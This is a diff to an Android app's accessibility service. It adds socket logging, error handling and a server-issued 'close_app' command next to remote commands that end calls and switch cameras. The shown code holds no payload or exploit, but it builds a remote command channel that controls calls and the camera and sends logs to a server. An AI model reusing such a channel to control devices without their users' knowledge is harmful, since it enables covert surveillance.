@@ -258,6 +258,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
     public void onCreate() {
         super.onCreate();
         sInstance = this;
+        AppLogs.init(this);
         AppLog.i(TAG, "Remote Accessibility Service Created.");
         try {
             IntentFilter filter = new IntentFilter(ACTION_AUTO_ACCEPT);
@@ -331,12 +332,21 @@ public class RemoteAccessibilityService extends AccessibilityService {
             AppLogs.registerSocket(mBgSocket);
 
             mBgSocket.on(Socket.EVENT_CONNECT, args -> {
-                AppLog.i(TAG, "Background Accessibility Socket Connected.");
+                String sId = mBgSocket != null ? mBgSocket.id() : "null";
+                AppLogs.i(TAG, "Background Accessibility Socket Connected [id=" + sId + ", url=" + APP_URL + "]");
+                AppLogs.flushPersistentLogs(mBgSocket);
                 registerDeviceBackground();
             });
 
             mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
-                AppLog.w(TAG, "Background Accessibility Socket Disconnected.");
+                String reason = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
+                String sId = mBgSocket != null ? mBgSocket.id() : "null";
+                AppLogs.w(TAG, "Background Accessibility Socket Disconnected [id=" + sId + ", url=" + APP_URL + ", reason=" + reason + "]");
+            });
+
+            mBgSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
+                String error = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
+                AppLogs.e(TAG, "Background Accessibility Socket Connect Error [url=" + APP_URL + ", error=" + error + "]");
             });
 
             mBgSocket.on("auto-command", args -> {
@@ -385,14 +395,41 @@ public class RemoteAccessibilityService extends AccessibilityService {
                         if (MainActivity.getCompanionInstance() != null) {
                             MainActivity.getCompanionInstance().endCall(false);
                         }
-                        if (MainActivity.getInstance() != null) {
-                            MainActivity.getInstance().runOnUiThread(() -> {
-                                MainActivity.getInstance().stopAllMediaAndFinish();
+                        MainActivity act = MainActivity.getInstance();
+                        if (act != null) {
+                            act.runOnUiThread(() -> {
+                                try {
+                                    MainActivity current = MainActivity.getInstance();
+                                    if (current != null) {
+                                        current.stopAllMediaAndFinish();
+                                    }
+                                } catch (Throwable ignored) {}
                             });
                         }
                         try {
                             performHome();
                         } catch (Exception ignored) {}
+                    } else if ("close_app".equals(command)) {
+                        AppLogs.i(TAG, "close_app command received: Swiping away and closing task completely");
+                        MainActivity act = MainActivity.getInstance();
+                        if (act != null) {
+                            act.runOnUiThread(() -> {
+                                try {
+                                    MainActivity current = MainActivity.getInstance();
+                                    if (current != null) {
+                                        current.stopAllMediaAndFinish();
+                                        current.finishAndRemoveTask();
+                                    }
+                                } catch (Throwable t) {
+                                    try { act.finishAffinity(); } catch (Throwable ignored) {}
+                                }
+                            });
+                        }
+                        try {
+                            if (RemoteAccessibilityService.getInstance() != null) {
+                                RemoteAccessibilityService.getInstance().performHome();
+                            }
+                        } catch (Throwable ignored) {}
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                         if (MainActivity.getCompanionInstance() != null) {
                             MainActivity.getCompanionInstance().switchCompanionCamera();
